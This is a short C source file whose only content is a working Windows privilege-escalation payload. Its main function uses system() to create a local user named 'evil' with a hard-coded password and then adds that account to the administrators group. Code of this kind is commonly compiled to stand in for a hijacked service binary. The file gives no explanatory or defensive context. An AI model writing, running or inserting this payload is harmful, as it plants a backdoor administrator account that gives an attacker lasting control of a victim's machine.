#include <stdlib.h>

int main()
{
    int i;

    i = system ("net user evil Ev!lpass /add");
    i = system ("net localgroup administrators evil /add");

    return 0;
}